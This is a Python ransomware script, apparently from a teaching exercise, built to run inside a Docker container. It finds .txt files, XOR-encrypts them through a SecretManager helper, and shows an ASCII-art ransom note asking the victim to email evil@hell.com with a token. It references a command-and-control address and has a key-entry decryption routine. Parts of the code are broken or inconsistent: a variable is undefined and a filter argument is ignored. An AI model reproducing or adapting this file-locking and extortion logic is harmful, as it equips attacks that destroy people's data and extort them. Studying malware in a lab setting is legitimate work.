import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        txt_files = Path().rglob('*.txt')
        
        return txt_files

    def encrypt(self):
        # main function for encrypting (see PDF)

        files = self.get_files(SecretManager()._path)
        
        # Setup cryptographic key
        SecretManager().setup()

        # Encrypt files
        for file_name in files:
            SecretManager().xorfiles(file_name, SecretManager().key)

        # Display message to victim
        print("Your files have been encrypted. Contact us to get the decryption key.")
        print("Token: {}".format(SecretManager().get_hex_token()))
        print("Contact: evil@hell.com")
        

    def decrypt(self):
        # main function for decrypting (see PDF)
        secret = SecretManager(TOKEN_PATH)
        secret.load()        
        while True:
            try:
                # Demander la clef
                key = input("Veuillez entrer la clef pour déchiffrer les fichiers : ")

                # Appeler set_key pour initialiser la clef
                secret.set_key(key)

                # Appeler xorfiles pour déchiffrer les fichiers
                secret.xorfiles(encrypted_files)

                # Appeler clean pour supprimer les fichiers chiffrés
                secret.clean(encrypted_files)

                # Afficher un message pour informer que tout s'est bien passé
                print("Les fichiers ont été déchiffrés avec succès !")
                return

            except ValueError:
                # Afficher un message indiquant que la clef est mauvaise
                print("La clef entrée est incorrecte. Veuillez réessayer.")
  
if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
